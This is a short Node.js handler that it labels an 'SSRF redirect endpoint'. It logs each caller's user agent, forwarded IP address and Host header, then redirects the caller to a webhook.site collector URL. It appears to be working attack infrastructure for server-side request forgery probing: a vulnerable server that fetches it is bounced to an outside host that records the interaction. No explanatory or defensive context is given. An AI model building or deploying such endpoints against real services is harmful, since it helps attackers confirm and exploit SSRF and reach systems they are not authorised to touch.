module.exports = (req, res) => {
  console.log("Incoming request to SSRF redirect endpoint");
  console.log("UA:", req.headers["user-agent"]);
  console.log("IP:", req.headers["x-forwarded-for"]);
  console.log("Host:", req.headers["host"]);

  res.statusCode = 302;
  res.setHeader(
    "Location",
    "https://webhook.site/4903292f-1db8-42a1-9269-be75685becee"
  );
  res.end("Redirecting...");
};
